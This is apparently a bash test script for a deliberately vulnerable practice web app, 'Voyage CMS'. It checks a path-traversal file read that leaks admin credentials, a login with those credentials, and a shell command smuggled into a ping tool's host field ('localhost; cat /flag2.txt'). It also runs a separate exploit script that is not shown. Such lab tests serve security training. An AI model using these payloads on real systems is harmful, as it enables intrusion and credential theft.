#!/usr/bin/env bash
# voyage: LFI -> credential leak -> command injection end-to-end test
set -e

DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")
PORT=8115
BASE="http://127.0.0.1:$PORT"
FAIL=0

cleanup() {
  $DC down --remove-orphans 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] Building container..."
$DC up --build -d

echo "[*] Waiting for Flask on port $PORT..."
for i in $(seq 1 30); do
  curl -sf "$BASE/" >/dev/null 2>&1 && break
  sleep 2
  if [ "$i" -eq 30 ]; then echo "[FAIL] Service timed out"; $DC logs; exit 1; fi
done
echo "[*] Service ready"

# --- Test 1: home page ---
echo ""
echo "[*] Test 1: home page"
OUT=$(curl -sf "$BASE/")
if echo "$OUT" | grep -qi "Voyage CMS"; then
  echo "[PASS] Home page contains Voyage CMS"
else
  echo "[FAIL] Home page missing Voyage CMS"; FAIL=1
fi

# --- Test 2: LFI leaks credentials ---
echo ""
echo "[*] Test 2: LFI via /view?file=../../etc/config leaks credentials"
OUT=$(curl -sf "$BASE/view?file=..%2F..%2Fetc%2Fconfig")
if echo "$OUT" | grep -q "password" && echo "$OUT" | grep -qE 'POC\{[0-9a-f]+\}'; then
  echo "[PASS] LFI returned config with credentials and flag1"
else
  echo "[FAIL] LFI did not return expected config: $OUT"; FAIL=1
fi

# --- Test 3: login with leaked credentials ---
echo ""
echo "[*] Test 3: login with leaked credentials returns flag1"
OUT=$(curl -sf -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Tr0ub4dor&3"}' "$BASE/admin/login")
if echo "$OUT" | grep -qE '"POC\{[0-9a-f]+\}"'; then
  echo "[PASS] Login returned flag1"
else
  echo "[FAIL] Login did not return flag1: $OUT"; FAIL=1
fi

# --- Test 4: command injection via ping returns flag2 ---
echo ""
echo "[*] Test 4: command injection in ping tool returns flag2"
OUT=$(curl -sf -X POST -H 'Content-Type: application/json' -H 'X-Token: admin-token-xyz' \
  -d '{"host":"localhost; cat /flag2.txt"}' "$BASE/admin/ping")
if echo "$OUT" | grep -qE '"POC\{[0-9a-f]+\}"'; then
  echo "[PASS] Command injection returned flag2"
else
  echo "[FAIL] Command injection did not return flag2: $OUT"; FAIL=1
fi

# --- Test 5: automated exploit ---
echo ""
echo "[*] Test 5: automated exploit"
EXPLOIT_OUT=$(python3 exploit/exploit.py "$BASE" 2>&1)
echo "$EXPLOIT_OUT"
FLAG_COUNT=$(echo "$EXPLOIT_OUT" | grep -cE 'POC\{[0-9a-f]+\}' || true)
if [ "$FLAG_COUNT" -ge 2 ]; then
  echo "[PASS] Exploit returned both flags"
else
  echo "[FAIL] Exploit did not return 2 POC flags"; FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"; exit 0
else
  echo "[FAIL] One or more tests failed"; exit 1
fi
